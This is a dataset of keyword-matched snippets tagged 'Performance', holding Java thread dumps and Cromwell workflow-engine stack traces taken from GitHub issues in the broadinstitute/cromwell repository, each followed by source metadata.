Performance,".concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-11"" #50 daemon prio=5 os_prio=31 tid=0x00007fb7720ce800 nid=0x8d03 waiting on condition [0x00000001317a7000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-10"" #49 daemon prio=5 os_prio=31 tid=0x00007fb7720cd800 nid=0x8b03 waiting on condition [0x00000001316a4000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArray",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:27657,concurren,concurrent,27657,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-12"" #51 daemon prio=5 os_prio=31 tid=0x00007fb7720cf000 nid=0x8f03 waiting on condition [0x00000001318aa000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-11"" #50 daemon prio=5 os_prio=31 tid=0x00007fb7720ce800 nid=0x8d03 waiting on condition [0x00000001317a7000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArray",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:26581,concurren,concurrent,26581,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-13"" #52 daemon prio=5 os_prio=31 tid=0x00007fb76e96e000 nid=0x9103 waiting on condition [0x00000001319ad000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-12"" #51 daemon prio=5 os_prio=31 tid=0x00007fb7720cf000 nid=0x8f03 waiting on condition [0x00000001318aa000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArray",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:25505,concurren,concurrent,25505,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-14"" #53 daemon prio=5 os_prio=31 tid=0x00007fb77061e000 nid=0x9303 waiting on condition [0x0000000131ab0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-13"" #52 daemon prio=5 os_prio=31 tid=0x00007fb76e96e000 nid=0x9103 waiting on condition [0x00000001319ad000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArray",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:24429,concurren,concurrent,24429,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-15"" #54 daemon prio=5 os_prio=31 tid=0x00007fb76b6b4000 nid=0x9503 waiting on condition [0x0000000131bb3000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-14"" #53 daemon prio=5 os_prio=31 tid=0x00007fb77061e000 nid=0x9303 waiting on condition [0x0000000131ab0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArray",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:23353,concurren,concurrent,23353,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-16"" #55 daemon prio=5 os_prio=31 tid=0x00007fb76e92f000 nid=0x9703 waiting on condition [0x0000000131cb6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-15"" #54 daemon prio=5 os_prio=31 tid=0x00007fb76b6b4000 nid=0x9503 waiting on condition [0x0000000131bb3000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArray",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:22277,concurren,concurrent,22277,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-17"" #56 daemon prio=5 os_prio=31 tid=0x00007fb76b6b6000 nid=0x9903 waiting on condition [0x0000000131db9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-16"" #55 daemon prio=5 os_prio=31 tid=0x00007fb76e92f000 nid=0x9703 waiting on condition [0x0000000131cb6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArray",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:21201,concurren,concurrent,21201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-18"" #58 daemon prio=5 os_prio=31 tid=0x00007fb770630800 nid=0x9d03 waiting on condition [0x00000001323d9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-3"" #57 prio=5 os_prio=31 tid=0x00007fb76e95e000 nid=0x9b03 waiting on condition [0x00000001322d6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Thread",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:19247,concurren,concurrent,19247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-19"" #59 daemon prio=5 os_prio=31 tid=0x00007fb770631000 nid=0x9f03 waiting on condition [0x00000001324dc000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-18"" #58 daemon prio=5 os_prio=31 tid=0x00007fb770630800 nid=0x9d03 waiting on condition [0x00000001323d9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArray",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:18171,concurren,concurrent,18171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-20"" #61 daemon prio=5 os_prio=31 tid=0x00007fb76b1f9000 nid=0xa303 waiting on condition [0x00000001325df000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-4"" #60 prio=5 os_prio=31 tid=0x00007fb76d42b000 nid=0xa103 waiting on condition [0x0000000132168000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Thread",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:16217,concurren,concurrent,16217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-1"" #26 daemon prio=5 os_prio=31 tid=0x00007fb76b442000 nid=0x7903 waiting on condition [0x000000012d905000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""Hikari Housekeeping Timer (pool db)"" #24 daemon prio=5 os_prio=31 tid=0x00007fb76d88f000 nid=0x7503 waiting on condition [0x000000012cebb000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0623fc0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:40666,concurren,concurrent,40666,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".engine-dispatcher-47 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99328,concurren,concurrent,99328,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,".forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2019-04-18 13:22:35,882 cromwell-system-akka.dispatchers.engine-dispatcher-42 ERROR - WorkflowManagerActor Workflow 4057b0c6-0019-4a00-b8af-e392fbf89697 failed (during ExecutingWorkflowState): cromwell.core.CromwellFatalException: java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.core.CromwellFatalException$.apply(core.scala:22); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:39); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run$$$capture(Promise.scala:60); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.UnsupportedOperationExcept",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:4587,concurren,concurrent,4587,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,1,['concurren'],['concurrent']
